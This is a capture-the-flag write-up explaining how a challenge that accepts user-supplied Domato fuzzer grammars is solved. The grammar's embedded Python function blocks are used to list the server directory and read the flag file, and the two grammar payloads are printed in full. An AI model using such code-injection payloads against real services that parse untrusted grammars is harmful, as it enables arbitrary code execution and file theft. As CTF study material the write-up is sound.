# YouKnowHowToFuzz!

> `Misc`, `Clone-and-Pwn`, `difficulty:Baby`
>
> I like eat domato, it''s excellent for dom fuzz, try to use your rule!

## Background

[Domato](https://github.com/googleprojectzero/domato) is an open-source fuzzer made to test DOM engines. Users can specify their own grammars to direct fuzzing.

## Setup

We are given some setup files, but the main part of the code is from `chal.py` (below). We can see that it takes in a grammar to parse and outputs 10 samples based on the grammar. The flag is located at `/srv/app/flag_$(md5sum /flag | awk '{print $1}')`.

```python
#!/usr/local/bin/python3
from grammar import Grammar

print("define your own rule >> ")
your_rule = ""
while True:
    line = input()
    if line == "<EOF>":
        break
    your_rule += line + "\n"

rwctf_grammar = Grammar()
err = rwctf_grammar.parse_from_string(your_rule)

if err > 0:
    print("Grammer Parse Error")
    exit(-1)

rwctf_result = rwctf_grammar._generate_code(10)
with open("/domato/rwctf/template.html", "r") as f:
    template = f.read()

rwctf_result = template.replace("<rwctf>", rwctf_result)

print("your result >> ")
print(rwctf_result)
```

## Vulnerability

Domato allows the execution of Python code to aid in generating programs. There are no restrictions on this code, so we can use it to locate/print the flag.

## Exploit

Looking through the Domato GitHub, there are some code samples that can be copied and modified slightly to execute python and return the result in the generated programs. The code I used to exploit the challenge was not minified, so some code is probably unnecessary.

Finding the flag file:

```
!begin function savesize
  context['size'] = ret_val
!end function

!begin function getf
  import os
  f = os.listdir("/srv/app")
  ret_val = " ".join(f)
!end function

<foo root> = <header><cr><lf><body>
<header> = Size: <int min=1 max=20 beforeoutput=savesize>
<body> = <call function=getf>

!varformat fuzzvar%05d
!lineguard try { <line> } catch(e) {}

!begin lines
<new element> = <call function=getf>;
<element>.doSomething();
!end lines

<EOF>
```

Reading the flag:

```
!begin function savesize
  context['size'] = ret_val
!end function

!begin function getf
  ret_val = open("flag_b261381493cd818b5fa9d25a1f249b30").read()
!end function

<foo root> = <header><cr><lf><body>
<header> = Size: <int min=1 max=20 beforeoutput=savesize>
<body> = <call function=getf>

!varformat fuzzvar%05d
!lineguard try { <line> } catch(e) {}

!begin lines
<new element> = <call function=getf>;
<element>.doSomething();
!end lines

<EOF>
```